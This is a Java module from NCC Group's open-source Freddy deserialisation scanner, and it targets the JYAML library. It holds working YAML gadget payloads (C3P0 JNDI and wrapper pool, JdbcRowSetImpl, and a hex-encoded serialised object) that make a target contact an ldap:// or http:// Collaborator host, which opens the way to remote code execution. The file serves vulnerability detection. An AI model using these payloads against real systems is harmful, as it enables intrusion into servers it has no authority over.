// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java JYAML library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JYAMLModule extends FreddyModuleBase {
    //C3P0RefDataSource payload data
    private static final String C3P0REF_PREFIX = "foo: !com.mchange.v2.c3p0.JndiRefForwardingDataSource\n  jndiName: \"";
    private static final String C3P0REF_SUFFIX = "\"\n  loginTimeout: 0\n";

    //C3P0WrapperConnPool payload data
    private static final String C3P0WRAP_PREFIX = "foo: !com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n  userOverridesAsString: \"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064672656464797400c8";
    private static final String C3P0WRAP_SUFFIX = "740003466f6f;\"\n";

    //JdbcRowSet payload data
    private static final String JDBC_PREFIX = "foo: !com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: \"";
    private static final String JDBC_SUFFIX = "\"\n  autoCommit: true\n";

    protected void initialiseModule() {
        setName("JYAML");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator("org.ho.yaml.exception.YamlException", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("'", "org.ho.yaml.exception.YamlException");

        registerActiveScanCollaboratorPayload(PN_C3P0RDS, false);
        registerActiveScanCollaboratorPayload(PN_C3P0WCP, false);
        registerActiveScanCollaboratorPayload(PN_JDBC, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0RDS:
                return C3P0REF_PREFIX + "ldap://" + hostname + "/" + C3P0REF_SUFFIX;

            case PN_C3P0WCP:
                return C3P0WRAP_PREFIX + encodeStringToAsciiHex(padString("http://" + hostname + "/", 200)) + C3P0WRAP_SUFFIX;

            case PN_JDBC:
                return JDBC_PREFIX + "ldap://" + hostname + "/" + JDBC_SUFFIX;
        }
        return null;
    }
}
